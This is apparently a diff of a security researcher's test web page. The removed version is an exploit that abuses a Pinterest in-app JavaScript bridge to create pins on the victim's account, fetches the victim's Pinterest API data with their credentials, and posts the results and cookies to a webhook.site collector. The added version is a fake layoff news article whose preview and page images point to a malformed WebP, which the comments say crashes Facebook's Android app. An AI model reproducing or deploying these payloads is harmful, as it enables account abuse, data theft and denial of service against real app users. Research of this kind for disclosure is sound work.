@@ -1,94 +1,50 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<meta charset="utf-8">
-<title>PT-M3 JSI Test</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Breaking: Tech Layoffs Hit 50,000 Workers This Week</title>
+
+<!-- Open Graph — og:image points to our malformed animated WebP.
+     Facebook's Android app loads this via Fresco/libscrollmerged.so
+     when rendering the link card, triggering the 1 GB canvas allocation crash. -->
+<meta property="og:type"              content="article">
+<meta property="og:site_name"         content="TechPulse News">
+<meta property="og:title"             content="Breaking: Tech Layoffs Hit 50,000 Workers This Week">
+<meta property="og:description"       content="Major tech companies announced sweeping cuts affecting tens of thousands of employees across engineering, sales, and operations divisions.">
+<meta property="og:image"             content="https://ankitkanojiy.github.io/test_page/img.webp">
+<meta property="og:image:type"        content="image/webp">
+<meta property="og:image:width"       content="1920">
+<meta property="og:image:height"      content="1080">
+<meta property="og:url"               content="https://ankitkanojiy.github.io/test_page/">
+
+<!-- Twitter card fallback -->
+<meta name="twitter:card"             content="summary_large_image">
+<meta name="twitter:image"            content="https://ankitkanojiy.github.io/test_page/img.webp">
+
+<!-- Favicon also points to our WebP — loaded by in-app browser icon fetch -->
+<link rel="icon" type="image/webp" href="./img.webp">
+<link rel="apple-touch-icon"      href="./img.webp">
+
 <style>
-body{font-family:monospace;font-size:13px;padding:16px;background:#fff;}
-#status{font-size:20px;font-weight:bold;padding:10px;margin-bottom:10px;border-radius:4px;}
-#log{white-space:pre-wrap;background:#f0f0f0;padding:10px;margin-top:10px;font-size:12px;}
+  body{font-family:Georgia,serif;max-width:780px;margin:40px auto;padding:0 20px;color:#222;line-height:1.7}
+  h1{font-size:2em;margin-bottom:.3em}
+  .byline{color:#666;font-size:.9em;margin-bottom:1.5em}
+  .hero{width:100%;height:400px;background:#111;margin-bottom:1.5em;display:flex;align-items:center;justify-content:center;overflow:hidden}
+  .hero img{width:100%;object-fit:cover}
+  p{margin-bottom:1em}
 </style>
 </head>
 <body>
-<div id="status">Checking...</div>
-<img src="https://picsum.photos/id/10/640/480" width="320" height="240" alt="mountain1">
-<img src="https://picsum.photos/id/11/640/480" width="320" height="240" alt="mountain2">
-<div id="log"></div>
-<script>
-var WH = "https://webhook.site/a4650d9c-8cfb-45cb-826c-02209dd79a8a";
-
-function log(m) {
-  var d = document.getElementById("log");
-  d.textContent += m + "\n";
-}
-
-function cb(path, body) {
-  fetch(WH + "/" + path, {
-    method: "POST",
-    headers: {"Content-Type": "text/plain"},
-    body: String(body)
-  }).catch(function() {});
-}
-
-log("[1] JS running at: " + window.location.href);
-log("[2] UA: " + navigator.userAgent);
-cb("js-ran", "href=" + window.location.href + "|UA=" + navigator.userAgent);
-
-if (typeof window.JavaScriptInterface !== "undefined") {
-  document.body.style.background = "#ff4444";
-  document.getElementById("status").style.background = "#ff4444";
-  document.getElementById("status").style.color = "#fff";
-  document.getElementById("status").textContent = "JSI FOUND - EXPLOIT ACTIVE";
-  log("[!] window.JavaScriptInterface IS PRESENT");
-  cb("jsi-found", "JSI present at " + window.location.href);
-
-  var pinPayload = JSON.stringify({
-    thumb: [{
-      url: "https://picsum.photos/id/20/640/480",
-      x: 0, y: 0, width: 640, height: 480
-    }],
-    meta: {
-      url: "https://attacker-controlled.example.com",
-      title: "PT-M3 ATTACKER PIN - AUTO CREATED"
-    }
-  });
-
-  log("[3] Calling window.JavaScriptInterface.onPinsLoaded()...");
-  try {
-    window.JavaScriptInterface.onPinsLoaded(pinPayload);
-    log("[+] onPinsLoaded() CALLED - pin creation triggered on victim account");
-    cb("on-pins-loaded-success", "payload=" + pinPayload);
-  } catch (e) {
-    log("[-] onPinsLoaded() error: " + e);
-    cb("on-pins-loaded-error", String(e));
-  }
-
-} else {
-  document.body.style.background = "#ffffa0";
-  document.getElementById("status").style.background = "#ffffa0";
-  document.getElementById("status").textContent = "JSI NOT FOUND (no pin closeup path)";
-  log("[-] window.JavaScriptInterface is NOT present");
-  log("    -> Open this URL from a pin closeup 'Visit website' button to get JSI");
-  cb("jsi-missing", "no JSI at " + window.location.href);
-}
-
-log("[4] Testing api.pinterest.com with credentials...");
-fetch("https://api.pinterest.com/v3/me/", {credentials: "include", mode: "cors"})
-  .then(function(r) {
-    log("[4] api.pinterest.com response status: " + r.status);
-    cb("api-status", "HTTP " + r.status);
-    return r.text();
-  })
-  .then(function(d) {
-    log("[4] api data (" + d.length + " bytes): " + d.substring(0, 200));
-    cb("api-data", d);
-  })
-  .catch(function(e) {
-    log("[4] fetch error (expected CORS block): " + e);
-    cb("cors-error", String(e));
-  });
-
-log("[5] document.cookie on this origin: [" + document.cookie + "]");
-</script>
+<h1>Breaking: Tech Layoffs Hit 50,000 Workers This Week</h1>
+<div class="byline">TechPulse News &bull; November 4, 2026</div>
+<div class="hero">
+  <!-- Direct WebP embed — if FB in-app browser renders this, Fresco may intercept it -->
+  <img src="./img.webp" alt="Layoffs" width="1920" height="1080">
+</div>
+<p>A wave of layoffs swept through the technology sector this week as major companies slashed tens of thousands of roles amid declining ad revenue and a prolonged period of economic uncertainty.</p>
+<p>Executives cited over-hiring during the pandemic boom, rising interest rates, and pressure from shareholders to cut costs as primary drivers behind the decisions.</p>
+<p>Workers in engineering, sales, and operations were disproportionately affected. Some employees received termination notices with as little as 30 minutes of advance warning before losing access to company systems.</p>
+<p>Employee advocacy groups have called for greater transparency and severance packages that reflect the contributions made during the hyper-growth years.</p>
 </body>
 </html>
